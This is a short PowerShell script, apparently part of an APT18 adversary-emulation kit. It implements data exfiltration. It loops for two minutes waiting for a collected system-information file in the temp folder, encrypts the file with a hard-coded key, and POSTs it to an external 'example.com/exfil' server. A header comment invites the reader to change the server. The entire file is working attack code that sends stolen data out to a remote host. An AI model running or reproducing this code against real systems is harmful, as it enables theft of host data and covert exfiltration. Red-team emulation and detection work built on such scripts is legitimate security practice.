#--------------------------------------------------------------
# Exfil of data using common channel like HTTP over port "80"
# Using "example.com" as exfile server, change as per your need.
#--------------------------------------------------------------

$timeout = new-timespan -Minutes 2
$sw = [diagnostics.stopwatch]::StartNew()
while ($sw.elapsed -lt $timeout){
    if (test-path $env:temp\APT18\SysInfo.txt){
        write-host "APT18 - Exfil..!"
		$file = Get-Content $env:temp\APT18\SysInfo.txt
		$key = (New-Object System.Text.ASCIIEncoding).GetBytes("01234567890123456789012345678901")
		$securestring = new-object System.Security.SecureString
		foreach ($char in $file.toCharArray()) {
			$secureString.AppendChar($char)
		}
		$encryptedData = ConvertFrom-SecureString -SecureString $secureString -Key $key
		Invoke-WebRequest -Uri http://example.com/exfil -Method POST -Body $encryptedData > $null 2>&1
        }
    start-sleep -seconds 5
}
write-host "Laying low..."